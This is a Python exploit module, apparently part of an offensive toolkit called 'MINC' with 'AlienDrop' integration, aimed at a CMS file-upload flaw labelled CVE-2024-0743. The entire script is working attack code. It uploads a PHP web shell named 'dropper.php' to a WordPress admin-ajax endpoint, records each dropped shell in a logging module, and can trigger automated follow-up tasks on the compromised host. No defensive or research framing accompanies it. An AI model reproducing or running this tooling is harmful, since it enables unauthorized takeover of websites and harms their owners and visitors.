# MINC - CVE-2024-0743 (CMS File Upload RCE â†’ Shell Drop with AlienDrop integration)

import requests
from modules.encrypt_module import generate_payload_blob
from modules.cdn_rotator import get_current_cdn_url
from modules.idgen import gen_shell_id
from modules import shell_logger
from random import randint
import os

try:
    from modules import shell_tasks  # Optional integration
    AUTOTASKS_ENABLED = True
except ImportError:
    AUTOTASKS_ENABLED = False

UPLOAD_ENDPOINT = "/wp-admin/admin-ajax.php?action=upload_vulnerable_file"
WEB_SHELL_NAME = "dropper.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (AlienDrop/CVE0743)"
}


def run(target, recon_data=None):
    upload_url = f"http://{target}{UPLOAD_ENDPOINT}"
    print(f"[CVE-0743] Attempting file upload to {upload_url}...")

    try:
        payload = generate_payload_blob(WEB_SHELL_NAME, drop_type="php_loader")
        files = {
            "file": (WEB_SHELL_NAME, payload, "application/x-php")
        }

        r = requests.post(upload_url, files=files, headers=HEADERS, timeout=10)

        if r.status_code in [200, 201] and "success" in r.text.lower():
            shell_id = gen_shell_id()
            cdn_prefix = get_current_cdn_url()
            dropped_url = f"{cdn_prefix}/wp-content/uploads/{WEB_SHELL_NAME}?v={randint(1000, 9999)}"
            print(f"[CVE-0743] Shell dropped successfully: {dropped_url}")

            shell_logger.log_shell_report(
                shell_id=shell_id,
                tags=["cve-0743", "cms", "upload"],
                tasks=["upload_shell"],
                metadata={"target": target, "url": dropped_url}
            )

            if AUTOTASKS_ENABLED:
                print(f"[CVE-0743] Executing auto-tasks for shell_id {shell_id}...")
                shell_tasks.run_auto_tasks(shell_id)

            return True

        else:
            print(f"[CVE-0743] Upload failed ({r.status_code}): {r.text[:100]}")
            return False

    except Exception as e:
        print(f"[CVE-0743] Upload error: {e}")
        return False

